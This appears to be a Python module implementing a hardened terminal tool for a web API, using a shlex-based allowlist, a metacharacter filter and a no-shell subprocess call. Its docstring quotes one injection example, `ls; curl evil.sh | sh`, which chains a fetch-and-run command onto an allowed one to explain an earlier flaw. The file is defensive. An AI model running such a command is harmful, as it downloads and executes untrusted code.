"""
Terminal command tool.

DISABLED BY DEFAULT. Executing shell commands supplied over an HTTP API is
remote code execution; this must stay off on any publicly reachable deployment.
Set ENABLE_TERMINAL_TOOL=true only for local development.

The previous implementation used `shell=True` with a `startswith` allowlist,
which meant `ls; curl evil.sh | sh` passed the check and ran both commands.
This version never invokes a shell: the input is tokenised with shlex, argv[0]
must match the allowlist exactly, and shell metacharacters are rejected outright.
"""

import shlex
import subprocess

from app.core.config import settings
from app.core.logging import get_logger

logger = get_logger(__name__)

ALLOWED_COMMANDS = frozenset({"ls", "pwd", "whoami", "date", "echo"})

# Characters that only have meaning to a shell. shlex would keep them as literal
# argv entries, but their presence signals an injection attempt worth refusing.
SHELL_METACHARACTERS = frozenset(";&|`$><\n\r")

COMMAND_TIMEOUT_SECONDS = 10


class TerminalResult(dict):
    """Plain dict result, kept as a type for readability at call sites."""


def _refuse(reason: str) -> TerminalResult:
    return TerminalResult(status="refused", reason=reason, output="")


def run_terminal_command(command: str) -> TerminalResult:
    """Run a whitelisted command with no shell involved."""
    if not settings.ENABLE_TERMINAL_TOOL:
        return _refuse(
            "The terminal tool is disabled. Set ENABLE_TERMINAL_TOOL=true to "
            "enable it (local development only)."
        )

    command = (command or "").strip()
    if not command:
        return _refuse("No command supplied.")

    if any(char in SHELL_METACHARACTERS for char in command):
        logger.warning("Rejected command containing shell metacharacters")
        return _refuse("Command contains shell metacharacters and was rejected.")

    try:
        argv: list[str] = shlex.split(command)
    except ValueError as exc:
        return _refuse(f"Could not parse command: {exc}")

    if not argv:
        return _refuse("No command supplied.")

    if argv[0] not in ALLOWED_COMMANDS:
        return _refuse(
            f"Command {argv[0]!r} is not allowed. "
            f"Allowed: {', '.join(sorted(ALLOWED_COMMANDS))}."
        )

    try:
        completed = subprocess.run(
            argv,
            shell=False,
            capture_output=True,
            text=True,
            timeout=COMMAND_TIMEOUT_SECONDS,
            cwd=settings.DATA_DIR,
        )
    except subprocess.TimeoutExpired:
        return _refuse(f"Command timed out after {COMMAND_TIMEOUT_SECONDS}s.")
    except Exception as exc:
        logger.exception("Terminal command failed")
        return _refuse(f"Command failed: {exc}")

    return TerminalResult(
        status="ok" if completed.returncode == 0 else "error",
        returncode=completed.returncode,
        output=completed.stdout,
        stderr=completed.stderr,
    )
